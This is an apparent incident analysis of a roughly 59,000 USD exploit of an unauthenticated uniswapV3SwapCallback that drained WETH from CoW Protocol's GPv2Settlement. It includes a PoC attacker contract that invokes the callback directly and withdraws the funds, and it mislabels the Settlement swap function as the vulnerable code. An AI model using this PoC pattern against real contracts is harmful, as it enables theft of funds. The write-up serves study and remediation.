# CoW Protocol — uniswapV3SwapCallback Unvalidated Callback Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-02 |
| **Protocol** | CoW Protocol (GPv2Settlement) |
| **Chain** | Ethereum |
| **Loss** | ~59,000 USD |
| **Attacker** | [0x00bad13f](https://etherscan.io/address/0x00bad13fa32e0000e35b8517e19986b93f000034) |
| **Attack Tx** | [0x2fc9f2fd](https://etherscan.io/tx/0x2fc9f2fd393db2273abb9b0451f9a4830aa2ebd5490d453f1a06a8e9e5edc4f9) |
| **Vulnerable Contract** | [0x9008d19f](https://etherscan.io/address/0x9008d19f58aabd9ed0d60971565aa8510560ab41) |
| **Root Cause** | No `msg.sender` validation in GPv2Settlement's `uniswapV3SwapCallback` or its integrated contract (addr2) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/CoW_exp.sol) |

---
## 1. Vulnerability Overview

CoW Protocol's integrated contract (0xa58cA3013) implements `uniswapV3SwapCallback` but does not verify whether the caller is a legitimate Uniswap V3 pool. The attacker directly invoked the callback with an encoded WETH amount and the GPv2Settlement contract address in the `data` parameter, draining WETH held by the Settlement contract.

## 2. Vulnerable Code Analysis

```solidity
// ❌ CoW integrated contract (addr2): uniswapV3SwapCallback with no validation
contract CoWLinkedContract {
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external payable {
        // ❌ No check that msg.sender is a legitimate UniswapV3 pool
        (uint256 amount, address settlement, address token, address recipient)
            = abi.decode(data, (uint256, address, address, address));

        // ❌ Transfers token from settlement (GPv2Settlement) to recipient
        IERC20(token).transferFrom(settlement, recipient, amount);
    }
}

// ✅ Fix:
// address pool = IUniswapV3Factory(factory).getPool(token0, token1, fee);
// require(msg.sender == pool, "not authorized");
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: GPv2Settlement.sol
    function swap(  // ❌ Vulnerability
        IVault.BatchSwapStep[] calldata swaps,
        IERC20[] calldata tokens,
        GPv2Trade.Data calldata trade
    ) external nonReentrant onlySolver {
        RecoveredOrder memory recoveredOrder = allocateRecoveredOrder();
        GPv2Order.Data memory order = recoveredOrder.data;
        recoverOrderFromTrade(recoveredOrder, tokens, trade);

        IVault.SwapKind kind =
            order.kind == GPv2Order.KIND_SELL
                ? IVault.SwapKind.GIVEN_IN
                : IVault.SwapKind.GIVEN_OUT;

        IVault.FundManagement memory funds;
        funds.sender = recoveredOrder.owner;
        funds.fromInternalBalance =
            order.sellTokenBalance == GPv2Order.BALANCE_INTERNAL;
        funds.recipient = payable(recoveredOrder.receiver);
        funds.toInternalBalance =
            order.buyTokenBalance == GPv2Order.BALANCE_INTERNAL;

        int256[] memory limits = new int256[](tokens.length);
        uint256 limitAmount = trade.executedAmount;
        // NOTE: Array allocation initializes elements to 0, so we only need to
        // set the limits we care about. This ensures that the swap will respect
        // the order's limit price.
        if (order.kind == GPv2Order.KIND_SELL) {
            require(limitAmount >= order.buyAmount, "GPv2: limit too low");
            limits[trade.sellTokenIndex] = order.sellAmount.toInt256();
            limits[trade.buyTokenIndex] = -limitAmount.toInt256();
        } else {
            require(limitAmount <= order.sellAmount, "GPv2: limit too high");
            limits[trade.sellTokenIndex] = limitAmount.toInt256();
            limits[trade.buyTokenIndex] = -order.buyAmount.toInt256();
        }

        GPv2Transfer.Data memory feeTransfer;
        feeTransfer.account = recoveredOrder.owner;
        feeTransfer.token = order.sellToken;
        feeTransfer.amount = order.feeAmount;
        feeTransfer.balance = order.sellTokenBalance;

        int256[] memory tokenDeltas =
            vaultRelayer.batchSwapWithFee(
                kind,
                swaps,
                tokens,
                funds,
                limits,
                // NOTE: Specify a deadline to ensure that an expire order
                // cannot be used to trade.
                order.validTo,
                feeTransfer
            );

        bytes memory orderUid = recoveredOrder.uid;
        uint256 executedSellAmount =
            tokenDeltas[trade.sellTokenIndex].toUint256();
        uint256 executedBuyAmount =
            (-tokenDeltas[trade.buyTokenIndex]).toUint256();

        // NOTE: Check that the orders were completely filled and update their
        // filled amounts to avoid replaying them. The limit price and order
        // validity have already been verified when executing the swap through
        // the `limit` and `deadline` parameters.
        require(filledAmount[orderUid] == 0, "GPv2: order filled");
        if (order.kind == GPv2Order.KIND_SELL) {
            require(
                executedSellAmount == order.sellAmount,
                "GPv2: sell amount not respected"
            );
            filledAmount[orderUid] = order.sellAmount;
        } else {
            require(
                executedBuyAmount == order.buyAmount,
                "GPv2: buy amount not respected"
            );
            filledAmount[orderUid] = order.buyAmount;
        }

        emit Trade(
            recoveredOrder.owner,
            order.sellToken,
            order.buyToken,
            executedSellAmount,
            executedBuyAmount,
            order.feeAmount,
            orderUid
        );
        emit Settlement(msg.sender);
    }
```

## 3. Attack Flow

```
Attacker (0x00bad13f)
  │
  ├─[1]─▶ Deploy AttackerC
  │
  ├─[2]─▶ Directly call addr2.uniswapV3SwapCallback:
  │         amount0Delta = -1978613680814188858940
  │         amount1Delta = 5373296932158610028
  │         data = abi.encode(amount, addr3(Settlement), WETH, attacker)
  │
  │         └─ ❌ No msg.sender validation → transfers Settlement's WETH to attacker
  │
  ├─[3]─▶ Unwrap WETH balance to ETH
  │
  └─[4]─▶ Drain ~59,000 USD in ETH
```

## 4. PoC Code

```solidity
contract AttackerC {
    receive() external payable {}

    function attack() public payable {
        // ❌ Encode Settlement contract + WETH + attacker address into data
        bytes memory data = abi.encode(
            uint256(1976408883179648193852),  // WETH amount to drain
            addr3,                            // GPv2Settlement
            addr1,                            // WETH
            address(this)                     // recipient (attacker)
        );

        // ❌ Directly call uniswapV3SwapCallback
        ICallbackLike(addr2).uniswapV3SwapCallback(
            -1978613680814188858940,
            5373296932158610028,
            data
        );

        // Unwrap WETH → ETH and transfer to attacker
        uint256 bal = IWETH9(addr1).balanceOf(address(this));
        IWETH9(addr1).withdraw(bal);
        payable(tx.origin).transfer(address(this).balance);
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing callback authentication |
| **Attack Vector** | Direct invocation of `uniswapV3SwapCallback` + `data` parameter manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **DASP** | Access Control Vulnerability |
| **Severity** | High |

## 6. Remediation Recommendations

1. **Validate pool address**: Verify `msg.sender` against the Uniswap V3 Factory
2. **Minimize `data` parameter**: Design callbacks to not include victim addresses in the `data` payload
3. **Protect Settlement accounts**: Restrict token approvals granted to GPv2Settlement
4. **Remove unnecessary callback implementations**: If the callback interface is not needed, do not implement it at all

## 7. Lessons Learned

- Even integrated contracts of well-audited protocols like CoW Protocol can contain unvalidated callback vulnerabilities.
- Integrated contracts (adapters, settlement hooks) require the same level of security auditing as the core protocol.
- Callback functions in contracts that hold WETH or stablecoin balances demand especially rigorous authentication.